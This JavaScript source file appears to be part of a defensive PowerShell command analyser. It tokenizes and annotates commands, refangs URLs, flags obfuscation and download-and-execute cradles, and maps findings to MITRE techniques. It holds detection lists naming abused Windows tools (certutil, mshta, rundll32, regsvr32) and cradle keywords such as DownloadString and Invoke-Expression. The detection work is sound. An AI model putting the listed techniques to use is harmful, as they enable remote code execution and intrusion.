const EX_OPERATORS={"-f": ["format operator: templates a string (used to reorder/hide keywords)", "notable"], "-join": ["joins array elements into a string (often rebuilds hidden strings)", "notable"], "-split": ["splits a string into parts", "info"], "-replace": ["regex replace (can rebuild/deobfuscate strings)", "notable"], "-as": ["casts to a type", "info"], "-bxor": ["bitwise XOR (commonly decrypts payloads)", "suspicious"], "-band": ["bitwise AND", "notable"], "-bor": ["bitwise OR", "notable"], "-eq": ["equals comparison", "info"], "-ne": ["not-equal comparison", "info"], "-match": ["regex match", "info"], "-like": ["wildcard match", "info"], "-contains": ["membership test", "info"], "-in": ["membership test", "info"], "-and": ["logical AND", "info"], "-or": ["logical OR", "info"], "-not": ["logical NOT", "info"]};
const EX_VARS={"$_": ["the current pipeline object", "info"], "$psitem": ["the current pipeline object", "info"], "$args": ["arguments passed to the script/block", "info"], "$null": ["the null value ('Out-Null' / '> $null' discards output)", "info"], "$true": ["boolean true", "info"], "$false": ["boolean false", "info"], "$host": ["the host application object", "info"], "$executioncontext": ["the runtime context (sometimes abused for AMSI)", "notable"], "$psversiontable": ["PowerShell version info (often a downgrade check)", "notable"]};
const EX_LOLBIN={"rundll32": ["runs code via rundll32 (LOLBin, often proxy execution)", "suspicious"], "regsvr32": ["runs code via regsvr32 (LOLBin, scriptlet execution)", "suspicious"], "mshta": ["runs HTA/scriptlet content via mshta (LOLBin)", "suspicious"], "certutil": ["certutil (often abused to download or decode payloads)", "suspicious"], "bitsadmin": ["BITS download (LOLBin)", "notable"], "wmic": ["WMI command-line (execution / lateral movement)", "notable"], "gwmi": ["Get-WmiObject: queries WMI", "info"], "iwmi": ["Invoke-WmiMethod: invokes a WMI method (execution)", "notable"], "sls": ["Select-String: searches text", "info"], "whoami": ["prints the current user (discovery)", "info"], "net": ["net.exe (accounts/shares/groups - discovery or manipulation)", "notable"], "netstat": ["lists network connections (discovery)", "info"], "nltest": ["domain trust enumeration (discovery)", "notable"], "systeminfo": ["host configuration (discovery)", "info"], "tasklist": ["lists running processes (discovery)", "info"], "cmd": ["cmd.exe shell", "notable"], "ps": ["Get-Process: lists processes", "info"], "kill": ["Stop-Process: terminates a process", "notable"], "gm": ["Get-Member: inspects object members", "info"]};
/* ---- component breakdown: pull each part apart and say what it does ---- */
const EX_TOK = /(?<comment>#[^\r\n]*)|(?<sstr>'(?:[^']|'')*')|(?<dstr>"(?:[^"`]|`.)*")|(?<typemethod>\[[\w.]+(?:\[\])?\]\s*::\s*\w+)|(?<typelit>\[[\w.]+(?:\[\])?\])|(?<cmdlet>[A-Za-z]\w*-[A-Za-z]\w*)|(?<alias>\b(?:iex|irm|iwr|icm|gc|gci|gcm|gm|gwmi|iwmi|sal|nal|saps|spps|ipmo|ps|kill|sls|curl|wget|rundll32|regsvr32|mshta|certutil|bitsadmin|wmic|cmd|whoami|net|netstat|nltest|systeminfo|tasklist)\b(?!\.))|(?<method>\.\s*\w+(?=\s*\())|(?<member>\.\s*\w+)|(?<varr>\$(?:env|global|script|local|using)\s*:\s*\w+|\$\{[^}]+\}|\$[A-Za-z_]\w*|\$[_?^$])|(?<flagop>-[A-Za-z]\w*)|(?<hashopen>@\{)|(?<arropen>@\()|(?<subexpr>\$\()|(?<pipe>\|)|(?<semi>;)|(?<amp>&)|(?<backtick>`)|(?<redirect>2>&1|>>|>)|(?<assign>=)/gi;
function exExcerpt(s,n){ n=n||60; s=String(s).replace(/[\r\n]+/g," "); return s.length<=n?s:s.slice(0,n)+" ..."; }
function exAnnotate(kind,text){
  const t=text.trim(), low=t.toLowerCase();
  if(kind==="comment") return ["comment / operator annotation","info"];
  if(kind==="sstr"||kind==="dstr"){
    const inner=t.slice(1,-1);
    if(/https?:\/\//i.test(inner)) return ["string literal containing a URL","notable"];
    if(kind==="dstr"&&(inner.includes("$(")||/\$\w/.test(inner))) return ["expandable string (interpolates variables / subexpressions)","info"];
    return ["string literal","info"];
  }
  if(kind==="typemethod"){
    const m=t.match(/\[([\w.]+)(?:\[\])?\]\s*::\s*(\w+)/);
    const typ=m?m[1].split(".").pop().toLowerCase():"", meth=m?m[2].toLowerCase():"";
    const td=EX_TYPES[typ], md=EX_METHODS[meth], parts=[];
    if(td)parts.push(td[0]); if(md)parts.push(md[0]); if(!parts.length)parts.push("static call "+t);
    const con=((td&&td[1]==="suspicious")||(md&&md[1]==="suspicious"))?"suspicious":(((td&&td[1]==="notable")||(md&&md[1]==="notable"))?"notable":"info");
    return [parts.join(" - "),con];
  }
  if(kind==="typelit"){ const typ=t.replace(/[\[\]]/g,"").split(".").pop().toLowerCase(); return EX_TYPES[typ]||[".NET type "+t,"info"]; }
  if(kind==="cmdlet"||kind==="alias"){
    if(EX_CMDLETS[low]) return EX_CMDLETS[low];
    if(EX_LOLBIN[low]) return EX_LOLBIN[low];
    const verb=low.split("-")[0], noun=t.includes("-")?t.split(/-(.+)/)[1]:"", vg=EX_VERBS[verb];
    return vg?[(vg+" "+(noun||"")).trim(),"info"]:["cmdlet/function "+t,"info"];
  }
  if(kind==="method"){ const w=low.replace(/[.\s]/g,""); return EX_METHODS[w]||["method call ."+t.replace(/[.\s]/g,"")+"()","info"]; }
  if(kind==="member"){ const w=low.replace(/[.\s]/g,""); return EX_METHODS[w]||EX_TYPES[w]||["member/property ."+t.replace(/[.\s]/g,""),"info"]; }
  if(kind==="varr"){ const base=low.replace(/\s/g,""); if(base.startsWith("$env:")) return ["environment variable "+t+" (e.g. a staging path)","notable"]; return EX_VARS[base]||["variable "+t,"info"]; }
  if(kind==="flagop"){ return EX_OPERATORS[low]||EX_PARAMS[low]||["parameter/switch "+t,"info"]; }
  const struct={hashopen:["hashtable literal @{ } (key/value pairs)","info"],arropen:["array subexpression @( )","info"],subexpr:["subexpression $( ) - evaluates code inline","notable"],pipe:["pipeline: sends output to the next command","info"],semi:["statement separator","info"],amp:["call operator & : invokes a command/scriptblock","notable"],backtick:["backtick: escape / line-continuation (also used to split identifiers)","notable"],redirect:["output redirection","info"],assign:["assignment: stores the value in the variable","info"]};
  return struct[kind]||[kind,"info"];
}
function explain(cmd,limit){
  limit=limit||140;
  const clean=cmd.replace(/\/\*\[decoded:[^\]]*\]\*\//g,"");
  const segs=[];
  for(const m of clean.matchAll(EX_TOK)){
    let kind=null; const g=m.groups; for(const k in g){ if(g[k]!==undefined){kind=k;break;} }
    const text=m[0]; if(!text.trim()) continue;
    const a=exAnnotate(kind,text);
    segs.push({text:exExcerpt(text),kind,desc:a[0],concern:a[1]});
    if(segs.length>=limit) break;
  }
  return segs;
}
function refang(s){
  return s.replace(/\[\.\]|\(\.\)|\{\.\}|\[dot\]|\(dot\)/gi,".")
          .replace(/hxxp(s?):\/\//gi,"http$1://")
          .replace(/\[:\]/g,":").replace(/\[\/\]/g,"/").replace(/\[@\]/g,"@");
}
function obfFindings(original, final){
  const ticks=(original.match(/`/g)||[]).length, caret=(original.match(/\^/g)||[]).length;
  const base=(final&&final!==original)?final:original, n=base.length||1;
  let symbols=0; for(const c of "{}[]()`^+%") symbols+=base.split(c).length-1;
  const ratio=symbols/n, plus=(base.match(/\+/g)||[]).length, reasons=[];
  if(ticks>=3) reasons.push(ticks+" backticks");
  if(caret>=3) reasons.push(caret+" carets");
  if(plus>=6) reasons.push(plus+" '+' concatenations");
  if(n>=40 && ratio>=0.28) reasons.push("symbol density "+Math.round(ratio*100)+"%");
  if(!reasons.length) return [];
  const sev=(ratio>=0.35||ticks>=6||caret>=6||plus>=12)?"medium":"low";
  return [{id:"OBF-DENSITY",name:"High obfuscation-character density",cat:"obfuscation",sev,mitre:["T1027.010"],
    desc:"Unusually high proportion of escape/splitting characters ("+reasons.join(", ")+") - a strong sign of mechanical obfuscation (e.g. Invoke-Obfuscation) even when no single layer statically resolves.",
    matched:reasons.slice(0,3)}];
}
const KNOWN_INSTALLERS=/community\.chocolatey\.org|chocolatey\.org\/install|get\.scoop\.sh|raw\.githubusercontent\.com\/[^'"]*install\.ps1/i;
function installerNote(hay){
  if(KNOWN_INSTALLERS.test(hay)) return [{id:"CTX-INSTALLER",name:"Resembles a known software-installer bootstrap",cat:"context",sev:"info",mitre:[],
    desc:"A URL associated with common legitimate installers (e.g. Chocolatey/Scoop) is present. The download-and-execute pattern may be benign here - verify the exact domain and context before escalating.",matched:[]}];
  return [];
}
function correlate(hay){
  const low=hay.toLowerCase(); const extra=[];
  const fetch=["downloadstring","downloadfile","downloaddata","net.webclient",
    "invoke-webrequest","invoke-restmethod"].some(k=>low.includes(k)) || /\b(irm|iwr)\b/.test(low);
  const execp=["iex","invoke-expression","scriptblock]::create","new-module",".getnewclosure"]
    .some(k=>low.includes(k));
  if(fetch && execp){
    extra.push({id:"COMBO-CRADLE",name:"Remote download + dynamic execution (cradle)",
      cat:"execution",sev:"high",mitre:["T1105","T1059.001"],
      desc:"A remote fetch feeds directly into dynamic code execution - a download-and-execute cradle. "+
           "This composition is the defining behaviour of a fileless loader and should be treated as "+
           "malicious barring a specific known-good justification.",
      matched:["fetch + dynamic-exec composition"]});
  }
  return extra;
}
async function analyze(cmd){
  const norm=refang(cmd);
  const {final,steps,layers}=await deobfuscate(norm);
  const hay=norm+"\n"+final;
  const findings=matchRules(hay).concat(correlate(hay)).concat(obfFindings(norm,final)).concat(installerNote(hay));
  const iocs=extractIOCs(hay);
  // An encoded command whose decoded content matches nothing else is still
  // worth a look (why encode it?) but shouldn't score like a real attack:
  // drop the encoding finding to medium and say why.
  const enc=findings.find(f=>f.id==="ENC-B64CMD");
  if(enc && layers>0){
    const other=findings.filter(f=>f!==enc && !/^ENC-|^EXE-NOPROFILE$/.test(f.id) && SEV_WEIGHT[f.sev]>=SEV_WEIGHT.medium);
    if(!other.length){
      enc.sev="medium";
      enc.desc=(enc.desc||"")+" The decoded content matched no other rule, so this is shown as medium: still check why the command was encoded.";
    }
  }
  const mitre=[...new Set(findings.flatMap(f=>f.mitre))].sort();
  const score=findings.reduce((a,f)=>a+SEV_WEIGHT[f.sev],0);
  const [vtext,vsev]=verdict(score);
  let sha=""; try{ sha=await sha256hex(cmd); }catch(e){ sha="(unavailable)"; }
  let segments=[]; try{ segments=explain(final); }catch(e){}
  return {original:cmd, final, steps, layers, segments, findings, iocs, mitre, score, vtext, vsev,
          sha, len:cmd.length, ts:new Date().toISOString().replace("T"," ").slice(0,19)+"Z"};
}




/* ---- fx API ---------------------------------------------------------- */
export async function psAnalyze(text){
  const cmd = String(text ?? "").slice(0, MAX_INPUT);
  const r = await analyze(cmd);
  r.truncated = String(text ?? "").length > MAX_INPUT;
  return r;
}
export { RULES, ATTACK, ATTACK_DATE, matchRules, refang, deobfuscate };
